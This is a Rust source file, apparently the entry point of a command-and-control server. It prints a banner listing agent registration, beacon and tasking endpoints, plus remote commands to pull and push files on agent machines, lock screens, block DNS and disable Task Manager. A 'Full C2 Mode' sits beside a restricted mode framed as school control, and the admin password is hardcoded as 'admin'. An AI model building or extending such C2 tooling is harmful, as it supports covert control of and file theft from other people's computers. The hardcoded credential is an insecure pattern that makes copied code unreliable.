mod models;
mod state;
mod handlers;

use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper_util::rt::TokioIo;
use state::State;
use std::net::SocketAddr;
use std::sync::{Arc, Mutex};
use tokio::net::TcpListener;

fn print_banner(state: &Arc<Mutex<State>>) {
    let mode = state.lock().unwrap().school_mode;
    let mode_name = if mode { "Restricted Mode" } else { "Full C2 Mode" };
    
    println!("[*] C2 Server listening on http://0.0.0.0:8080");
    println!("[*] Server mode: {}", mode_name);
    println!("[*] Change mode with: POST /set_mode {{\"password\":\"admin\", \"school_mode\": true/false}}");
    println!();
    println!("[*] Endpoints:");
    println!("    POST   /register                  - Register new agent");
    println!("    POST   /beacon                    - Agent check-in");
    println!("    POST   /task_result               - Submit task results");
    println!("    POST   /add_task                  - Queue task for agent (password: admin)");
    println!("    GET    /agents                    - List all agents");
    println!("    GET    /tasks/<task_id>           - Get task details and result");
    println!("    GET    /agent/<agent_id>/tasks    - List all tasks for agent");
    println!("    GET    /mode                      - Get current server mode");
    println!("    POST   /set_mode                  - Switch between Restricted/Full mode");
    println!("    POST   /protocol                  - Execute protocol command (Restricted mode)");
    println!("    POST   /revert_all                - Revert all changes on agent");
    println!();
    println!("[*] Available Protocols (Restricted Mode):");
    println!("    PROTOCOL:QUIZ_MODE|<url>          - Lock to specific webpage");
    println!("    PROTOCOL:BLOCK_DNS                - Block all DNS");
    println!("    PROTOCOL:BLOCK_DNS_WHITELIST|<domains> - Whitelist specific domains");
    println!("    PROTOCOL:GET_FILE|<path>          - Download file from agent");
    println!("    PROTOCOL:UPLOAD_FILE|<path>|<base64> - Upload file to agent");
    println!("    PROTOCOL:LOCK_SCREEN              - Lock the workstation");
    println!("    PROTOCOL:DISABLE_TASK_MANAGER     - Disable Task Manager");
    println!("    PROTOCOL:ENABLE_TASK_MANAGER      - Enable Task Manager");
    println!("    PROTOCOL:REVERT_ALL               - Restore all settings");
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let addr = SocketAddr::from(([0, 0, 0, 0], 8080));
    let listener = TcpListener::bind(addr).await?;
    
    let state = Arc::new(Mutex::new(State::new()));
    print_banner(&state);

    loop {
        let state = Arc::clone(&state);
        let (stream, _) = listener.accept().await?;
        let io = TokioIo::new(stream);

        let svc = service_fn(move |req| {
            let state = Arc::clone(&state);
            handlers::handle_request(req, state)
        });

        tokio::task::spawn(async move {
            if let Err(err) = http1::Builder::new().serve_connection(io, svc).await {
                eprintln!("[-] Error serving connection: {:?}", err);
            }
        });
    }
}
